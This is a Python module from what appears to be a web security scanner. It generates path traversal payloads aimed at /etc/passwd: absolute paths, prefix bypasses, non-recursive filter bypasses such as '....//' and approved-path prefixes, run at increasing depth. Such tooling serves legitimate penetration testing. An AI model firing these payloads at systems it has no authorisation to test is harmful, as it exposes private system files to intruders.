r"""Path traversal — the full range of filter/prefix/encoding bypasses.

Covers the File Inclusion technique set:
  * absolute path (/etc/passwd),
  * relative (../../../etc/passwd) at increasing depth,
  * prefix bypass (/../../../etc/passwd) — when input is appended after a prefix,
  * non-recursive filter bypass: ....// , ..././ , ....\/ , ....//// ,
  * approved-path prefix (./languages/../../../etc/passwd),
  * url / double-url encoding, applied by the client per config.
"""
from __future__ import annotations

from collections.abc import Iterator

from .base import BaseModule

# Traversal sequences (a prefix that climbs one directory level).
# Note: "....\\/" in the code is the literal string  ....\/  (one backslash).
_SEQUENCES = ["../", "....//", "..././", "....\\/", "....////"]

# Approved-path prefixes that sometimes need to precede the traversal.
_APPROVED_PREFIXES = ["", "languages/", "./languages/", "lang/"]


class TraversalModule(BaseModule):
    name = "traversal"
    description = "Path traversal + filter/prefix/encoding bypasses"

    def _norm(self, target: str) -> str:
        """Relative path with no leading / (for appending the traversal)."""
        return target.lstrip("/").replace("C:/", "").replace("c:/", "")

    def payloads(self) -> Iterator[str]:
        """Full sweep: every target x approved-prefix x sequence x depth
        (BaseModule.run() fans encoding out on top of this, and sends it
        all concurrently — see BaseModule._run_concurrent). There used to
        be a hand-written sequential run() here that stopped at the first
        confirmed depth per (prefix, seq); it's gone because that only
        saved requests on an already-vulnerable target, while making the
        common case — nothing vulnerable, every depth tried anyway — fully
        serial and, against a remote target, painfully slow.
        """
        for target in self.targets():
            rel = self._norm(target)

            # 1) absolute path — when input goes straight into include()
            yield target
            # 2) prefix bypass — a leading / neutralizes an appended prefix
            yield "/" + rel

            # 3) relative traversal: every sequence x depth x approved-prefix
            for prefix in _APPROVED_PREFIXES:
                for seq in _SEQUENCES:
                    for depth in range(1, self.cfg.max_depth + 1):
                        yield prefix + seq * depth + rel

    # run() is inherited from BaseModule: gathers every payload above
    # concurrently (bounded by cfg.concurrency) and dedups the confirmed
    # findings. --all-hits (dedup off) is now its only effect here, same
    # as every other module — no more separate exhaustive-vs-smart split.
